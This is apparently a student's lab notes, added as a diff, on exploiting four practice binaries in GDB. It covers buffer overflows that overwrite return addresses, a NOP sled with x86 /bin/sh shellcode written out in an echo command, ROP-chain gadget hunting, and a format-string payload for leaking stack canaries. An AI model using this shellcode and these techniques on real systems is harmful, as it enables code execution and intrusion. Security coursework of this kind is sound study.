@@ -1,0 +1,99 @@
+HOW TO SET THE ENVIRONMENT:
+unset environment
+set env TEMP=1000
+set exec-wrapper setarch i686 -R -3 
+
+
+
+BINARY 1:
+You will need to change the return address of a function to point at a certain address with a buffer overflow
+STEPS:
+
+
+OUTSIDE GDB:
+-create the input file named file.1
+-echo `printf "54 AAAAAAAAAAAAAAAA"` > file.1  // inserts text in your file
+
+
+INSIDE GDB
+-start
+-disas // you will find the functions called, look for display_file method and insert breakpoint eg. b *0x0804893b
+-r file.1 // that's how you run the binary
+// insert breakpoints that you consider useful - find functions that use strcopy or memcpy and compare the stack before and after the call of the method to check which function changes the stack
+-x/32x $ebp-32  // stack content
+-x/32x $ebp-64 // stack content
+// Now find the return address in the stack and change the input file to change the return address
+// Find the desired return address, usually a display_root_menu method
+// Put everything together
+
+
+
+
+
+
+BINARY 2:
+You will need to change the return address of a function to point at a certain address with a buffer overflow
+STEPS:
+
+
+OUTSIDE GDB:
+-create the input file named file.2
+-echo `printf "54 \x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAA"` > file.2 // inserts text in your file
+// \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80 this is the shellcode , \x90 is NOP
+
+INSIDE GDB
+-start
+-disas // you will find the functions called, look for display_file method and insert breakpoint eg. b *0x0804893b
+-r file.2 // that's how you run the binary
+// insert breakpoints that you consider useful - find functions that use strcopy or memcpy and compare the stack before and after the call of the method to check which function changes the stack
+-x/32x $ebp-32  // stack content
+-x/32x $ebp-64 // stack content
+// Now find the return address in the stack and change the input file to change the return address using the command above (echo...)
+// Find the beginning of the shellcode in the stack and change the return address of the stack to point at it
+// Put everything together
+
+
+
+
+
+BINARY 3: 
+
+ROP-CHAIN
+
+Our aim is to create a rop chain, which is pretty much ready in the java program i created, we just need to find the addresses of the gadgets and enter them in the array, as well as find the distance from the start of the buffer to the return address in the stack, that's where we will put our first gadget.
+
+
+To find the gadgets:
+
+inside of gdb:
+breakpoint at display_file
+r file.3
+info proc mapping 
+x/1000i (the lowest address)
+
+NOW find the gadgets
+if they are off try moving the address by a byte
+enter the gadgets' addresses in the program
+
+still inside of gdb:
+info files
+find the data segment and enter its address in the program
+
+after you do this, play with the input to make the first gadget appear in the return address of the stack
+
+
+
+BINARY 4:
+
+same thing with 3, but remove the code from the comments and you'll get the correct output, DONT FORGET TO CHANGE THE SIZE IN THE FILE
+
+
+
+FOR CANARIES:
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+
+
+
+ps -p $$
+
+
